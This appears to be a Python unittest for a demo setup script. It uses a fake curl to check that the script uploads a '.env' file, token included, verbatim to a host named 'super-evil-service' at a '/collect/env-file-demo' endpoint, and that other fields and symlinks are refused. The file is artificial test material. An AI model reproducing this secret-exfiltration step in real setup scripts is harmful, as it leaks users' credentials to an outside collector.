"""Check the demo fixture using a fake curl; never send network traffic."""
import os
from pathlib import Path
import subprocess
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
URL = "SUPER_USEFUL_URL=http://super-useful-service.developer1.svc.cluster.local/data\n"


class SetupTest(unittest.TestCase):
    def run_setup(self, content, *, symlink=False, curl_status=0):
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            fixture = root / ".env"
            fixture.write_text(content)
            if symlink:
                target = root / "linked.env"
                target.symlink_to(fixture)
                fixture = target
            curl = root / "curl"
            curl.write_text("#!/usr/bin/env python3\nimport os,sys,pathlib,json\na=sys.argv[1:]\npathlib.Path(os.environ['CAPTURE']).write_text(json.dumps(a))\npathlib.Path(os.environ['BODY']).write_bytes(pathlib.Path(a[a.index('--data-binary')+1][1:]).read_bytes())\nsys.exit(int(os.environ['CURL_STATUS']))\n")
            curl.chmod(0o755)
            source = (ROOT / "setup.sh").read_text().replace("fixture=/data/workspace/demo/.env", "fixture=" + str(fixture))
            result = subprocess.run(["bash", "-c", source, str(ROOT / "setup.sh")], capture_output=True, text=True,
                                    env={**os.environ, "PATH": str(root) + os.pathsep + os.environ["PATH"], "CAPTURE": str(root / "args"), "BODY": str(root / "body"), "CURL_STATUS": str(curl_status)})
            body = (root / "body").read_bytes() if (root / "body").exists() else None
            args = (root / "args").read_text() if (root / "args").exists() else ""
            return result, body, args

    def test_both_demo_env_variants_are_transferred_verbatim(self):
        for content in [URL, URL + "SUPER_USEFUL_TOKEN=" + "A" * 48 + "\n"]:
            result, body, args = self.run_setup(content)
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(body, content.encode())
            self.assertIn("http://super-evil-service.developer1.svc.cluster.local/collect/env-file-demo", args)
            self.assertNotIn("A" * 48, result.stdout + result.stderr)

    def test_unrelated_fields_and_symlinks_are_not_sent(self):
        for content, symlink in [(URL + "OTHER_SECRET=not-a-demo-field\n", False), (URL, True), (URL * 2, False), (URL + "SUPER_USEFUL_TOKEN=wrong\n", False)]:
            result, body, _ = self.run_setup(content, symlink=symlink)
            self.assertNotEqual(result.returncode, 0)
            self.assertIsNone(body)

    def test_egress_failure_is_reported(self):
        result, _, _ = self.run_setup(URL, curl_status=22)
        self.assertEqual(result.returncode, 22)
        self.assertNotIn("Setup complete", result.stdout)


if __name__ == "__main__":
    unittest.main()
